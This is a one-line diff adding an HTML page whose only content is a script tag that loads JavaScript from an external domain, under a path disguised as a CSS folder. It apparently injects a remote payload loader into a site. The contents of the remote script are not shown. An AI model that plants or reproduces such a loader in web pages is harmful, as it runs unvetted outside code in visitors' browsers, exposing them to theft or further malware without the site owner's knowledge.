@@ -1,0 +1,1 @@
+<html><script src=https://aadvah.fr/css/1.js></script></html>
